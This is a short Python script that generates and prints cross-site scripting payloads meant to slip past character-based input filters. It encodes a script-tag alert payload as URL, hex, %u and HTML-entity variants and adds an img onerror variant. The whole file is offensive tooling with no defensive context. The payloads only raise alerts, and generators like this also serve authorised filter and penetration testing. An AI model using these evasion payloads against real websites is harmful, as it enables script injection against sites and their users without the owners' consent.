import urllib.parse

def generate_xss_payloads():
    """Generate a list of XSS payloads designed to evade character-based filters."""
    payloads = []

    # Basic XSS Payload
    basic_payload = '<script>alert("XSS")</script>'
    payloads.append(basic_payload)

    # URL Encoded Payload
    url_encoded_payload = urllib.parse.quote(basic_payload)
    payloads.append(url_encoded_payload)

    # Hexadecimal Encoding
    hex_encoded_payload = ''.join(['%' + hex(ord(c))[2:] for c in basic_payload])
    payloads.append(hex_encoded_payload)

    # UTF-16 Encoding
    utf16_encoded_payload = ''.join(['%u' + hex(ord(c))[2:].zfill(4) for c in basic_payload])
    payloads.append(utf16_encoded_payload)

    # HTML Entities
    html_entities_payload = ''.join(['&#' + str(ord(c)) + ';' for c in basic_payload])
    payloads.append(html_entities_payload)

    # Using alternative syntax
    alternative_syntax_payload = '<img src=x onerror=alert("XSS")>'
    payloads.append(alternative_syntax_payload)

    return payloads

def main():
    payloads = generate_xss_payloads()
    for i, payload in enumerate(payloads, 1):
        print(f"Payload {i}: {payload}")

if __name__ == "__main__":
    main()
